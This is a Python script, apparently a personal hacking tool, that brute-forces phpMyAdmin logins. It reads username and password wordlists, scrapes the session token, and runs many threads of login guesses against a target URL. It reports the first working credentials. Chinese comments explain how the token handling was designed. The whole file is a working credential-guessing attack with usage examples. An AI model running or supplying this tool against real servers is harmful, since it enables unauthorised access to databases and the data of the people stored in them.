import requests
import re
from html import unescape
import random
import argparse
import threading
import time
from queue import Queue
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

'''

对PhpMyadmin接口爆破程序，支持自定义线程，路径，字典，端口，支持https
多线程，生产者消费者模型，可以实现指定username，userfile password，passfile 自定义超时时间,线程数
'''

'''
phpmyadmin 有token，所以要先访问一下页面获得token，对应字段为响应的set-cookie的phpmyadmin字段，
注意第一个为了获得token所以第一次尝试登陆的时候也要是post请求，get请求不行。

最初想法：每次发一个空包，获取token，然后再发爆破包，如果多线程爆破的话，token用一次就失效了，所以那种情况只能串行
后面改进：第一次发一个空包，username，password都为空的post包，为此session获取一个token，
然后每次爆破初始化这个session的title和token，这样就不用每爆破一次，要发两个包了。
问题：
    另外，由于所有线程共用一个session，所以当有一个线程爆破进去之后，可能出现这个token是正确的，
    所以可能会直接跳转进去，导致re不能匹配到指定字段，既不能不能获得token字段，使得获取list[0]时越界，
    所以其他线程不知道已经爆破成功了，没有终止，匹配不到对应标签，也就获取不到指定的token字段，
    所以在线程产生IndexError的时候，让他停止，
    但是这样有个坏处就是，如果是因为不可达，而访问不到可能不知道是否是程序的问题。
'''


class Mybruster_phpmyadmin:
    def __init__(self, url=None, queue=None, username=None, password=None, userfile=None, passfile=None,timeout=5):
        self.url = url
        self.queue = queue
        self.username = username
        self.password = password
        self.userfile = userfile
        self.passfile = passfile
        self.timeout = timeout
        self.session = requests.session()
        self.headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}
        self.post_data = {'pma_username': None, 'pma_password': None, "server": 1, "target": "index.php", "token": None}
        # 生产者 初始化执行
        self.title, self.token = self.get_title_and_token()
        self.get_data_from_file(self.username,self.password,self.userfile,self.passfile)
    # 生成随机UA
    def random_useragent(self):
        USER_AGENTS = [
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
            "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
            "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
            "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
            "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
        ]
        return random.choice(USER_AGENTS)

    # def read_data(self):
    # 初始化执行一次就可以了，为了获得初始token
    def get_title_and_token(self):
        res = self.session.post(url=self.url, headers=self.headers, data=self.post_data, timeout=self.timeout)
        title = re.findall("<title>(.*?)</title>", res.text)
        token = re.findall(r'<input type="hidden" name="token" value="(.*?)" /></fieldset>', res.text)
        token = unescape(token)  # html实体解码
        # print(title, token)
        return [title, token]

    # 获取数据传入管道
    def get_data_from_file(self, username=None, password=None, userfile=None, passfile=None):
        if userfile is not None and passfile is not None:
            with open(userfile, 'r') as f:
                with open(passfile, 'r') as g:
                    for userline in f:
                        for passline in g:
                            self.queue.put((userline.strip(), passline.strip()))
                            # print((userline.strip(), passline.strip()))
        elif username is not None and passfile is not None:
            with open(passfile, 'r') as g:
                for passline in g:
                    self.queue.put((username, passline.strip()))
                    # print((username, passline.strip()))
        elif username is not None and password is not None:
            self.queue.put((username, password))
        else:
            print("params set error!")
            exit(1)

    def requestt(self, username, password):
        # res1 = self.session.post(url=self.url, headers=headers, data=self.post_data)
        # title1 = re.findall("<title>(.*?)</title>", res1.text)
        # token1 = re.findall(r'<input type="hidden" name="token" value="(.*?)" /></fieldset>', res1.text)[0]
        # token1 = unescape(token)  # html实体解码
        post_data = {'pma_username': username, 'pma_password': password, "server": 1, "target": "index.php",
                     "token": self.token}
        # print(post_data)
        res2 = self.session.post(url=self.url, headers=self.headers, data=post_data, timeout=self.timeout)
        # print(res2.status_code)
        title2 = re.findall("<title>(.*?)</title>", res2.text)
        # print(res2.text)
        # exit(1)
        # time.sleep(2)
        # print(title2)
        if title2 != self.title:
            print("Success:", "username:", username, ',', "password:", password)
            self.queue.queue.clear() # 爆破成功清空队列
            exit(0)
        else:
            # 当有一个线程爆破成功后，好像这个session就进去了，导致匹配不到下面的字段，所以，会报列表越界，加个try强制跳过吧。
            try:
                token2 = re.findall(r'<input type="hidden" name="token" value="(.*?)" /></fieldset>', res2.text)[0]
                token2 = unescape(token2)  # html实体解码
                self.title, self.token = title2, token2
            except IndexError:
                # pass
                exit(1)

    # 多线程+
    def start(self):
        while not self.queue.empty():
            username, password = self.queue.get()
            self.requestt(username, password)


if __name__ == '__main__':
    usage = """
    phpmyadmin bruter By Komomon.
    python3 test31.py -u http://192.168.148.136:81/phpMyAdmin/index.php --user root -pf asdf.txt
    python3 test31.py -u http://192.168.148.136:81/phpMyAdmin/index.php --uf qwer.txt -pf asdf.txt
    python test31.py -u http://192.168.148.136:81/phpMyAdmin/index.php --user root -pf asdf.txt -t 50
    python test31.py -u http://192.168.148.136:81/phpMyAdmin/index.php --user root -pf asdf.txt --timeout 10
    可以实现指定username，userfile password，passfile 自定义超时时间,线程数
    """
    parser = argparse.ArgumentParser(usage=usage, description="")
    parser.add_argument("-u", "--url", type=str, default=None, dest="url", help="URL")
    parser.add_argument("--user", type=str, default=None, dest="username", help="Username")
    parser.add_argument("--pass", type=str, default=None, dest="password", help="Password")
    parser.add_argument("-uf", "--userfile", type=str, default=None, dest="userfile", help="Username file")
    parser.add_argument("-pf", "--passfile", type=str, default=None, dest="passfile", help="Password file")
    parser.add_argument("-t", "--threads", type=int, default=10, dest="threads", help="Threads")
    parser.add_argument("--timeout", type=int, default=5, dest="timeout", help="Request timeout")
    # parser.add_argument("--timeout", type=int, default=2, dest="timeout", help="Request timeout")
    args = parser.parse_args()
    Url = args.url
    Username = args.username
    Password = args.password
    Userfile = args.userfile
    Passfile = args.passfile
    Thread_maxnum = args.threads
    Timeout = args.timeout
    print("Bruster bot is running...")
    print("Url: %s" %Url)
    MY_QUEUE = Queue()
    thread_list = []
    if args.timeout != 0 and args.timeout > 0:
        timeout = args.timeout
    else:
        print("--timeout Setting error.")
        exit(1)
    bruster_bot = Mybruster_phpmyadmin(url=Url, queue=MY_QUEUE,username=Username, password=Password, userfile=Userfile, passfile=Passfile, timeout=Timeout)

    for i in range(Thread_maxnum):
        # 注意target参数没有(),有()会线程卡死，应该是根据名称去起线程执行函数
        thread = threading.Thread(target=bruster_bot.start)
        thread_list.append(thread)
    #     print(thread_list)
    # print(thread_list)
    for thread in thread_list:
        thread.start()
    for thread in thread_list:
        thread.join()

